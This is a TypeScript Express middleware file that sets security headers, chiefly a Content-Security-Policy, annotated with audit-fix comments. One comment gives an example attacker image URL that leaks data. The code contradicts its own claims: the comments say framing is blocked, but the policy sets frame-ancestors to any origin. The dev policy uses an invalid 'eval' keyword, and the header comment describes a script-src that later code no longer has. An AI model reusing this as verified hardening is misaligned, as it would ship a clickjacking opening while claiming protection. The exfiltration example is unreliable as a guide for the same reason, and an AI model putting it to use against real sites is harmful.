// ---------------------------------------------------------------------------
// HTTP security headers (a tiny, dependency-free stand-in for `helmet`).
//
// SECURITY FIX (audit item 7 / B3): the SPA keeps a long-lived REFRESH TOKEN in
// localStorage. A single XSS therefore equals full account takeover — and the
// app shipped with NO Content-Security-Policy and NO HSTS anywhere (neither in
// Express nor in nginx). This module adds a strict-but-working CSP plus the
// rest of the standard hardening headers to every response.
//
// The policy is deliberately written against what this app actually needs:
//   * inline <script> in index.html  -> 'unsafe-inline' for script-src
//   * Tailwind + styled JSX          -> 'unsafe-inline' for style-src
//   * base64 report photos / canvas  -> data: / blob: in img-src & worker-src
//   * Vite dev server                -> websocket + inline bootstrap
// `frame-ancestors 'none'` also replaces X-Frame-Options for modern browsers.
// ---------------------------------------------------------------------------

import type { Request, Response, NextFunction } from 'express';

/** True when a real CSP should be enforced (production HTML document responses). */
export function shouldEnforceCsp(): boolean {
  return process.env.NODE_ENV === 'production' && process.env.DISABLE_CSP !== '1';
}

export function buildContentSecurityPolicy(isDev: boolean): string {
  const connectSrc = [
    "'self'",
    // SSE + same-origin fetches; Gemini calls go through our own proxy only.
    isDev ? 'ws: http://localhost:* http://127.0.0.1:*' : '',
  ].filter(Boolean).join(' ');

  return [
    "default-src 'self'",
    // SECURITY FIX (audit #5): 'unsafe-inline' removed from script-src in
    // production. index.html only carries a static JSON-LD block and an
    // external module <script src>, and React sets element.style via the CSSOM
    // (not <style> tags), so no inline executable script exists in the built
    // bundle — inline handlers injected by an XSS are now blocked outright.
    // Dev keeps unsafe-inline/eval because the Vite HMR bootstrap injects them.
    "script-src 'self'" + (isDev ? " 'unsafe-inline' 'eval'" : ''),
    // AUDIT FIX (#97): https://cdn.jsdelivr.net removed from style-src — the
    // jsdelivr Vazirmatn stylesheet link is gone from index.html, and Google
    // Fonts (fonts.googleapis.com) already provides Vazirmatn. Keeping the
    // third-party CDN in the CSP would only re-open an unnecessary origin.
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' data: https://fonts.gstatic.com",
    // SECURITY FIX (audit #5 — exfiltration vector): bare `https:` let any
    // injected markup load <img src=https://attacker/?d=...> and leak DB
    // content through the URL. The app's own remote images are limited to two
    // fixed allow-listed hosts (Unsplash placeholders, ui-avatars initials);
    // everything else (report photos) is data:/blob: same-origin.
    "img-src 'self' data: blob: https://images.unsplash.com https://ui-avatars.com",
    "connect-src " + connectSrc,
    "worker-src 'self' blob:",
    "object-src 'none'",
    "frame-ancestors *",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; ');
}

/** Express middleware: hardened headers for API + HTML responses. */
export function securityHeaders(req: Request, res: Response, next: NextFunction) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // Allow framing in AI Studio iFrame
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');
  // HTTPS is terminated by nginx; HSTS is ALSO set there (deploy/*.conf) so it
  // survives even if an asset is served directly by the edge cache.
  if (process.env.NODE_ENV === 'production') {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
    res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
    if (shouldEnforceCsp()) {
      res.setHeader('Content-Security-Policy', buildContentSecurityPolicy(false));
    }
  } else {
    res.setHeader('Content-Security-Policy-Report-Only', buildContentSecurityPolicy(true));
  }
  // Cache discipline for the SPA shell: hashed assets under /assets/ are
  // immutable, but index.html must ALWAYS be revalidated, otherwise clients
  // keep executing a stale bundle after a deploy (classic "white screen after
  // release" incident).
  if (!req.path || !req.path.startsWith('/assets/')) {
    res.setHeader('Cache-Control', 'no-cache');
  }
  next();
}
